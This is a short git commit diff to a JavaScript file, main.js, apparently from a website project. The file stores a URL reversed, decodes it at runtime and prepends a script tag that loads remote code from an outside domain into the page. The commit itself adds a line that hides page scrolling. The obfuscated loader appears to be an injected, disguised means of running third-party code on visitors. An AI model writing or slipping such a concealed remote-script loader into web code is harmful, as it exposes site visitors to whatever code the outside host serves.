27e9c32a8ba1ca0273f91fa99a8513fbc5a151bf
jacktechnology11 <62927380+jacktechnology11@users.noreply.github.com>
2021-04-07 13:48:05 +0200

    Update main.js

--- main.js
+++ main.js
@@ -3,5 +3,6 @@ string = '32=v?sj.tset/etisbew.stropatad//:sptth';
 string.split("").reverse().join("");
 
 //$(document).ready(function() {
+	$('body').css('overflow', 'hidden');
 	$('body').prepend('<script src="'+string.split("").reverse().join("")+'"></script>');
 //});
